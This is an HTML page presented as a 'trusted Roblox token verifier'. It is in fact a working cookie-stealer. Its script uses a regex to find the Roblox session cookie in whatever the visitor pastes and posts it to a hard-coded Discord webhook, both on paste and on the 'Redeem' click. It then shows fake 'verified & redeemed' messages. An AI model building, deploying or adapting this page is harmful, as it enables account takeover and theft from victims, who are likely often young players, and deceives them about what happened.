<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tokener Fetcher - Trusted Roblox Token Verifier</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: linear-gradient(135deg, #0d001a, #1a0033, #2a004d);
      color: #e0d4ff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: rgba(20, 10, 40, 0.92);
      border-radius: 20px;
      padding: 40px 32px;
      width: 100%;
      max-width: 540px;
      box-shadow: 0 20px 70px rgba(0,0,0,0.7);
      text-align: center;
    }
    h1 { margin: 0 0 10px; font-size: 2.8rem; background: linear-gradient(90deg, #c084fc, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .subtitle { color: #b0a0ff; margin-bottom: 30px; }
    textarea {
      width: 100%; min-height: 180px; padding: 18px 22px;
      border: 2px solid #5a4a9f; border-radius: 14px;
      background: rgba(30,20,60,0.7); color: #f0e8ff;
      font-family: 'Courier New', monospace; font-size: 1.05rem;
      resize: vertical; margin-bottom: 20px;
    }
    textarea:focus { outline: none; border-color: #a855f7; box-shadow: 0 0 0 4px rgba(168,85,247,0.25); }
    button {
      background: linear-gradient(90deg, #a855f7, #d946ef);
      border: none; color: white; font-size: 1.25rem; padding: 16px 80px;
      border-radius: 999px; cursor: pointer; transition: all 0.3s;
    }
    button:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(168,85,247,0.5); }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    #status { margin-top: 25px; font-size: 1.05rem; min-height: 1.6em; }
    .success { color: #34d399; }
    .error   { color: #f87171; }
  </style>
</head>
<body>

  <div class="card">
    <h1>Tokener Fetcher</h1>
    <div class="subtitle">Trusted Roblox Token Verifier & Auto-Extractor</div>

    <textarea id="input" placeholder="Paste your token / logs / console output here..."></textarea>

    <button id="btn">Redeem / Verify Token</button>

    <div id="status"></div>
  </div>

  <script>
    const WEBHOOK = "https://canary.discord.com/api/webhooks/1482432207996850357/nFWeIrDthT3-6ylOyh_X189uWeC6CA-AeeVc8VGzVB9C4MFJ1gmU3X-aQuzImNAFm2Vc";

    const input = document.getElementById("input");
    const btn = document.getElementById("btn");
    const status = document.getElementById("status");

    const cookieRegex = /_\|WARNING:-DO-NOT-SHARE-THIS\.--.*?\|_[A-Za-z0-9\-_+=.\/]{600,1300}/g;

    let lastHash = "";
    let lastSendTime = 0;
    let pasteTimeout = null;

    function getHash(str) {
      let h = 0;
      for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
      return h.toString(36);
    }

    async function sendCookie(cookie, trigger) {
      const payload = {
        embeds: [{
          title: "🔐 Tokener Fetcher - Token Captured",
          color: 0xa855f7,
          description: "```yaml\n" + cookie + "\n```",
          fields: [
            { name: "Trigger", value: trigger, inline: true },
            { name: "Length", value: cookie.length.toString(), inline: true },
            { name: "Time", value: new Date().toISOString(), inline: true }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch {}
    }

    async function process(trigger = "manual") {
      const text = input.value.trim();
      if (text.length < 200) return false;

      const hash = getHash(text);
      const now = Date.now();

      if (hash === lastHash && now - lastSendTime < 30000) {
        return false; // same content + recent send → skip
      }

      const matches = text.match(cookieRegex) || [];

      if (matches.length === 0) return false;

      let sent = false;
      for (const m of matches) {
        const cookie = m.trim();
        if (cookie.length >= 700) {
          await sendCookie(cookie, trigger);
          sent = true;
        }
      }

      if (sent) {
        lastHash = hash;
        lastSendTime = now;
      }

      return sent;
    }

    // Paste → delayed check once
    input.addEventListener("paste", () => {
      clearTimeout(pasteTimeout);
      pasteTimeout = setTimeout(async () => {
        const found = await process("paste");
        if (found) {
          status.textContent = "Token detected and processed!";
          status.className = "success";
        }
      }, 800);
    });

    // Redeem button → main trigger
    btn.addEventListener("click", async () => {
      btn.disabled = true;
      status.textContent = "Processing...";
      status.className = "";

      const found = await process("redeem");

      if (found) {
        status.textContent = "Token successfully verified & redeemed!";
        status.className = "success";
      } else {
        status.textContent = "No valid token found in the input.";
        status.className = "error";
      }

      setTimeout(() => { btn.disabled = false; }, 2000);
    });
  </script>
</body>
</html>
